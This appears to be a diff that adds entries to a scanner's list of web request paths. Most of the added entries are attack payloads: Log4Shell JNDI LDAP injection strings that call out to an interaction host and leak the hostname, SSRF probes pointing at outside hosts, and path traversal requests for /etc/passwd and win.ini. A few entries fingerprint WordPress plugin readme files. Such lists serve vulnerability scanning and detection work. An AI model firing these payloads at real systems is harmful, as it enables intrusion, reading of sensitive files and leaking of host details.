@@ -74,3 +74,13 @@
 /api/geojson?url=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}
 /user/error
 /dr/authentication/oauth2/oauth2login?error=%24%7Bjndi%3Aldap%3A%2F%2F%24%7BhostName%7D.{{interactsh-url}}%7D
+/wp1/home-18/?qtproxycall=https://{{interactsh-url}}
+/wp-content/plugins/pie-register/readme.txt
+/api/v1/core/proxy/jsonprequest?objresponse=false&websiteproxy=true&escapestring=false&url=http://oast.live
+/wp-content/plugins/ultimate-member/readme.txt
+/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.{{interactsh-url}}/a%7D
+/c42api/v3/LoginConfiguration?username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&url=https://localhost
+/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd
+/systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini
+/api/geojson?url=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.url.{{interactsh-url}}}
+/dr/authentication/oauth2/oauth2login?error=$%7Bjndi%3Aldap%3A%2F%2F$%7B%3A-{{rand1}}%7D$%7B%3A-{{rand2}}%7D.$%7BhostName%7D.uri.{{interactsh-url}}%7D
